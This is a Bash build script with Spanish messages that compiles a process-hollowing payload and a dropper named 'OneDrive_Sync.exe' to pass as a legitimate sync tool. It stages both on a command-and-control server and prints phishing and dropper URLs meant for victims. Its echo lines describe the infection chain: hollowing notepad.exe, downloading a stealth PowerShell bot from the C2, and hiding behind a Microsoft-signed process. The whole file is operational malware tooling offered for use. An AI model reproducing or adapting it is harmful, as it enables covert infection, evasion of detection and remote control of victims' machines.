#!/bin/bash
set -e

cd ~/C2-suite/bot_hollow

echo "[*] Compilando Hollow Payload (el que se inyecta en notepad)..."
x86_64-w64-mingw32-g++ -o hollow_payload.exe hollow_payload.cpp \
    -lwininet -s -O2 -static \
    -Wl,--subsystem,windows \
    -fno-stack-protector -fno-asynchronous-unwind-tables

echo "[+] Payload compilado: hollow_payload.exe ($(du -h hollow_payload.exe | cut -f1))"

echo "[*] Compilando Hollow Dropper (el que hace process hollowing)..."
x86_64-w64-mingw32-g++ -o OneDrive_Sync.exe hollow_dropper.cpp \
    -s -O2 -static \
    -Wl,--subsystem,windows \
    -fno-stack-protector -fno-asynchronous-unwind-tables

echo "[+] Dropper compilado: OneDrive_Sync.exe ($(du -h OneDrive_Sync.exe | cut -f1))"

# Copiar al servidor C2
mkdir -p ~/C2-suite/c2_server/static/payloads
cp OneDrive_Sync.exe ~/C2-suite/c2_server/static/payloads/
cp hollow_payload.exe ~/C2-suite/c2_server/static/payloads/

echo ""
echo "=========================================="
echo "  PROCESS HOLLOWING LISTO"
echo "=========================================="
echo ""
echo "Ficheros en c2_server/static/payloads/:"
ls -la ~/C2-suite/c2_server/static/payloads/
echo ""
echo "URLs para la víctima:"
echo "  Phishing:  http://192.168.1.14:8000/static/phishing_elite.html"
echo "  Dropper:   http://192.168.1.14:8000/static/payloads/OneDrive_Sync.exe"
echo ""
echo "FUNCIONAMIENTO:"
echo "  1. Víctima descarga OneDrive_Sync.exe"
echo "  2. Doble click → Dropper ejecuta"
echo "  3. Dropper crea notepad.exe SUSPENDIDO"
echo "  4. Dropper vacía notepad.exe (NtUnmapViewOfSection via syscall)"
echo "  5. Dropper escribe hollow_payload.exe en la memoria de notepad"
echo "  6. Dropper reanuda el hilo de notepad"
echo "  7. Dropper MUERE (ExitProcess)"
echo "  8. notepad.exe ahora ejecuta NUESTRO código"
echo "  9. El código descarga bot_stealth.ps1 del C2"
echo " 10. El bot se conecta al C2 en modo opaco"
echo ""
echo "En el administrador de tareas solo verás:"
echo "  - notepad.exe (firmado por Microsoft)"
echo "  - powershell.exe (el bot, oculto)"
echo ""
